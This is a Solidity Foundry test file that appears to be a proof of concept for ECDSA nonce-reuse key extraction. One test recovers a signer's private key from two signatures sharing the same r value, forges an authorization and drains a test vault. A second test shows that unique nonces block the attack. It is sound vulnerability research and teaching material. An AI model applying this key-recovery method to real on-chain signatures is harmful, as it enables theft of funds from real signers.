// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {EcdsaNonceReuse, SignerGatedVault} from "../src/signature/NonceReuse.sol";

/// PoC for `ecdsa-nonce-reuse-key-extraction` (SC01).
///   forge test --match-contract NonceReuse -vvv
///
/// Invariant: only the holder of the signer's private key can authorize a `release`. ECDSA keeps
/// that key secret ONLY if every signature uses a unique nonce k. The vulnerable case shows two
/// signatures that reused k (same r) — observable on-chain — let anyone recover the key and forge
/// authorizations. The safe case shows that with unique nonces (distinct r) the same recovery
/// math yields garbage, so the key stays secret.
///
/// Vectors generated offline with a fixed-k secp256k1 signer (see research-log) and independently
/// verified: k = (h1-h2)/(s1-s2), d = (s1*k-h1)/r.
///
/// See docs/exploits/ecdsa-nonce-reuse-key-extraction.md
contract NonceReuseTest is Test {
    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    // --- k-reuse vector set (two messages signed with the SAME nonce k) ---
    uint256 constant D = 0x0ffee0001d15ea5e0badc0de01234576c979731ec8a99f664678f7ddc60e9baf; // secret (attacker doesn't know)
    uint256 constant R = 0xbb50e2d89a4ed70663d080659fe0ad4b9bc3e06c17a227433966cb59ceee020d;
    uint256 constant S1 = 0x5487ca6070d69937a5b17ed0b07f5e0b63b387147810e39f0a072efcfe1b0766;
    uint256 constant S2 = 0xbc36fe8c1cb618645b2432494d34c708708179f4365b078fdc62b0631c59e3ca;
    uint256 constant H1 = 0x61656769733a6e6f6e63652d72657573653a6d6573736167652d6f6e65212121;
    uint256 constant H2 = 0x61656769733a6e6f6e63652d72657573653a6d6573736167652d74776f212121;

    address attacker = makeAddr("attacker");

    function test_vulnerable_kReuseExtractsKeyAndDrains() public {
        address signer = vm.addr(D);
        SignerGatedVault vault = new SignerGatedVault{value: 5 ether}(signer);

        // The attacker only sees the two same-r signatures. Recover the private key on-chain.
        uint256 dRec = EcdsaNonceReuse.recoverPrivateKey(H1, H2, R, S1, S2);
        assertEq(dRec, D, "private key recovered from k-reuse");
        assertEq(vm.addr(dRec), signer, "recovered key controls the signer address");

        // Forge a perfectly valid authorization with the leaked key and drain the vault.
        bytes32 h = vault._digest(attacker, 5 ether, vault.nonce());
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(dRec, h);
        vault.release(attacker, 5 ether, v, r, s);

        assertEq(attacker.balance, 5 ether, "vault drained with a forged-but-valid signature");
        assertEq(address(vault).balance, 0, "invariant broken: non-signer authorized a release");
    }

    function test_safe_uniqueNonceCannotExtractKey() public {
        // A disciplined signer: unique nonces => two messages produce DIFFERENT r.
        (address signer, uint256 pk) = makeAddrAndKey("disciplined-signer");
        bytes32 m1 = keccak256("message-one");
        bytes32 m2 = keccak256("message-two");
        (, bytes32 r1, bytes32 s1) = vm.sign(pk, m1);
        (, bytes32 r2, bytes32 s2) = vm.sign(pk, m2);
        assertTrue(r1 != r2, "unique nonce => distinct r (no shared-r precondition)");

        // Running the extraction math without a real shared r yields garbage, not the key.
        uint256 dRec = EcdsaNonceReuse.recoverPrivateKey(uint256(m1), uint256(m2), uint256(r1), uint256(s1), uint256(s2));
        assertTrue(vm.addr(dRec) != signer, "no nonce reuse => key not recoverable");
    }
}
